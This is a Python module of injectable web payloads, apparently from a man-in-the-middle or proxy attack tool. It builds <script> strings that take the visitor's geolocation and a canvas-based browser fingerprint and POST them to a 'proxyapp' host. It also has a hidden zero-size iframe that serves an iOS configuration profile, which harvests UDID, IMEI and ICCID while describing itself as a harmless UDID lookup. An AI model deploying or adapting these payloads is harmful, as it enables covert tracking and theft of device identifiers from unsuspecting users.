#!/usr/bin/env python
# -*- coding: utf-8 -*-

xhr_request = '''function xhrRequest(a,b,c,d){function j(){e.readyState<4||200===e.status&&4===e.readyState&&d(e)}var e;if("undefined"!=typeof XMLHttpRequest)e=new XMLHttpRequest;else for(var f=["MSXML2.XmlHttp.5.0","MSXML2.XmlHttp.4.0","MSXML2.XmlHttp.3.0","MSXML2.XmlHttp.2.0","Microsoft.XmlHttp"],g=0,h=f.length;h>g;g++)try{e=new ActiveXObject(f[g]);break}catch(i){}e.onreadystatechange=j,e.open(b,a,!0),"POST"==b&&e.setRequestHeader("Content-type","application/x-www-form-urlencoded"),e.send(c)}'''

geolocation_handler = '''
if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(function(position) {
        alert(position);
        xhrRequest('http://proxyapp/geolocation', 'POST', 'position=' + JSON.stringify(position), function(e) {});
    });
}
'''

# Credit to https://github.com/Valve/fingerprintjs
fingerprintjs = '''!function(a,b,c){"undefined"!=typeof module&&module.exports?module.exports=c():"function"==typeof define&&define.amd?define(c):b[a]=c()}("Fingerprint",this,function(){"use strict";var a=function(a){var b,c;b=Array.prototype.forEach,c=Array.prototype.map,this.each=function(a,c,d){if(null!==a)if(b&&a.forEach===b)a.forEach(c,d);else if(a.length===+a.length){for(var e=0,f=a.length;f>e;e++)if(c.call(d,a[e],e,a)==={})return}else for(var g in a)if(a.hasOwnProperty(g)&&c.call(d,a[g],g,a)==={})return},this.map=function(a,b,d){var e=[];return null==a?e:c&&a.map===c?a.map(b,d):(this.each(a,function(a,c,f){e[e.length]=b.call(d,a,c,f)}),e)},"object"==typeof a?(this.hasher=a.hasher,this.screen_resolution=a.screen_resolution,this.canvas=a.canvas,this.ie_activex=a.ie_activex):"function"==typeof a&&(this.hasher=a)};return a.prototype={get:function(){var a=[];if(a.push(navigator.userAgent),a.push(navigator.language),a.push(screen.colorDepth),this.screen_resolution){var b=this.getScreenResolution();"undefined"!=typeof b&&a.push(this.getScreenResolution().join("x"))}return a.push((new Date).getTimezoneOffset()),a.push(this.hasSessionStorage()),a.push(this.hasLocalStorage()),a.push(!!window.indexedDB),document.body?a.push(typeof document.body.addBehavior):a.push("undefined"),a.push(typeof window.openDatabase),a.push(navigator.cpuClass),a.push(navigator.platform),a.push(navigator.doNotTrack),a.push(this.getPluginsString()),this.canvas&&this.isCanvasSupported()&&a.push(this.getCanvasFingerprint()),this.hasher?this.hasher(a.join("###"),31):this.murmurhash3_32_gc(a.join("###"),31)},murmurhash3_32_gc:function(a,b){var c,d,e,f,g,h,i,j;for(c=3&a.length,d=a.length-c,e=b,g=3432918353,h=461845907,j=0;d>j;)i=255&a.charCodeAt(j)|(255&a.charCodeAt(++j))<<8|(255&a.charCodeAt(++j))<<16|(255&a.charCodeAt(++j))<<24,++j,i=4294967295&(65535&i)*g+((65535&(i>>>16)*g)<<16),i=i<<15|i>>>17,i=4294967295&(65535&i)*h+((65535&(i>>>16)*h)<<16),e^=i,e=e<<13|e>>>19,f=4294967295&5*(65535&e)+((65535&5*(e>>>16))<<16),e=(65535&f)+27492+((65535&(f>>>16)+58964)<<16);switch(i=0,c){case 3:i^=(255&a.charCodeAt(j+2))<<16;case 2:i^=(255&a.charCodeAt(j+1))<<8;case 1:i^=255&a.charCodeAt(j),i=4294967295&(65535&i)*g+((65535&(i>>>16)*g)<<16),i=i<<15|i>>>17,i=4294967295&(65535&i)*h+((65535&(i>>>16)*h)<<16),e^=i}return e^=a.length,e^=e>>>16,e=4294967295&2246822507*(65535&e)+((65535&2246822507*(e>>>16))<<16),e^=e>>>13,e=4294967295&3266489909*(65535&e)+((65535&3266489909*(e>>>16))<<16),e^=e>>>16,e>>>0},hasLocalStorage:function(){try{return!!window.localStorage}catch(a){return!0}},hasSessionStorage:function(){try{return!!window.sessionStorage}catch(a){return!0}},isCanvasSupported:function(){var a=document.createElement("canvas");return!(!a.getContext||!a.getContext("2d"))},isIE:function(){return"Microsoft Internet Explorer"===navigator.appName?!0:"Netscape"===navigator.appName&&/Trident/.test(navigator.userAgent)?!0:!1},getPluginsString:function(){return this.isIE()&&this.ie_activex?this.getIEPluginsString():this.getRegularPluginsString()},getRegularPluginsString:function(){return this.map(navigator.plugins,function(a){var b=this.map(a,function(a){return[a.type,a.suffixes].join("~")}).join(",");return[a.name,a.description,b].join("::")},this).join(";")},getIEPluginsString:function(){if(window.ActiveXObject){var a=["ShockwaveFlash.ShockwaveFlash","AcroPDF.PDF","PDF.PdfCtrl","QuickTime.QuickTime","rmocx.RealPlayer G2 Control","rmocx.RealPlayer G2 Control.1","RealPlayer.RealPlayer(tm) ActiveX Control (32-bit)","RealVideo.RealVideo(tm) ActiveX Control (32-bit)","RealPlayer","SWCtl.SWCtl","WMPlayer.OCX","AgControl.AgControl","Skype.Detection"];return this.map(a,function(a){try{return new ActiveXObject(a),a}catch(b){return null}}).join(";")}return""},getScreenResolution:function(){return[screen.height,screen.width]},getCanvasFingerprint:function(){var a=document.createElement("canvas"),b=a.getContext("2d"),c="http://valve.github.io";return b.textBaseline="top",b.font="14px 'Arial'",b.textBaseline="alphabetic",b.fillStyle="#f60",b.fillRect(125,1,62,20),b.fillStyle="#069",b.fillText(c,2,15),b.fillStyle="rgba(102, 204, 0, 0.7)",b.fillText(c,4,17),a.toDataURL()}},a});
var fingerprint = new Fingerprint({
    canvas: true,
    screen_resolution: true,
    ie_activex: true
}).get();
alert(fingerprint);
if (fingerprint) {
    xhrRequest('http://proxyapp/fingerprint', 'POST', 'fingerprint=' + fingerprint, function(e) {});
}
'''

mobileconfig_plist = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
    <dict>
        <key>PayloadContent</key>
        <dict>
            <key>URL</key>
            <string>http://proxyapp/retrieve.php</string>
            <key>DeviceAttributes</key>
            <array>
                <string>UDID</string>
                <string>IMEI</string>
                <string>ICCID</string>
                <string>VERSION</string>
                <string>PRODUCT</string>
            </array>
        </dict>
        <key>PayloadOrganization</key>
        <string>yourwebsite.com</string>
        <key>PayloadDisplayName</key>
        <string>Profile Service</string>
        <key>PayloadVersion</key>
        <integer>1</integer>
        <key>PayloadUUID</key>
        <string>9CF421B3-9853-4454-BC8A-982CBD3C907C</string>
        <key>PayloadIdentifier</key>
        <string>com.yourwebsite.profile-service</string>
        <key>PayloadDescription</key>
        <string>This temporary profile will be used to find and display your current device's UDID.</string>
        <key>PayloadType</key>
        <string>Profile Service</string>
    </dict>
</plist>
'''

geolocation = "<script>" + xhr_request + geolocation_handler + "</script>"
fingerprint = "<script>" + xhr_request + fingerprintjs + "</script>"
mobileconfig = '<iframe width="0" height="0" src="http://proxyapp/mobileconfig"></iframe>'
